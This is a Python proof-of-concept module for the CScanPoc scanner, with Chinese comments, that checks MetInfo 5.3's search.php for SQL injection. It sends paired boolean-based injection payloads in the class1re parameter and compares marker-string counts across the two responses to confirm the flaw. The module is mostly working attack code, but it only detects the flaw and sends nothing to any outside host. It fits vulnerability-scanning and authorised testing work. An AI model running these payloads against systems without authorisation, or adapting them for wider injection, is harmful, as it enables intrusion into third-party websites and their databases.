# coding: utf-8
import re
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0003'  # 平台漏洞编号，留空
    name = 'MetInfo sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        MetInfo SQL注入漏洞：
        /MetInfo5.3/search/search.php.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0106582'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = '5.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd319a473-638a-4f59-8984-0a5939672bdc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0106582
            payload_and_true = '/MetInfo5.3/search/search.php?class1=2&class2=&class3=&searchtype=2&searchword=e327b894f7c7782b9a3ce3697556902a&lang=cn&class1re=)%20and%201--%20sd'
            payload_and_false = '/MetInfo5.3/search/search.php?class1=2&class2=&class3=&searchtype=2&searchword=e327b894f7c7782b9a3ce3697556902a&lang=cn&class1re=)%20and%200--%20sd'
            # test false
            #code, head, res, errcode, _ = curl.curl(url + payload_and_false)
            r1 = requests.get(self.target + payload_and_false)

            if r1.status_code == 200:
                m = re.findall("e327b894f7c7782b9a3ce3697556902a", r1.text)
                if len(m) == 3:
                    # test true
                    #code, head, res, errcode, _ = curl.curl(url + payload_and_true)
                    r2 = requests.get(self.target + payload_and_true)

                    if r2.status_code == 200:
                        m = re.findall(
                            "e327b894f7c7782b9a3ce3697556902a", r2.text)
                        if len(m) == 2:
                            # security_info(url)
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
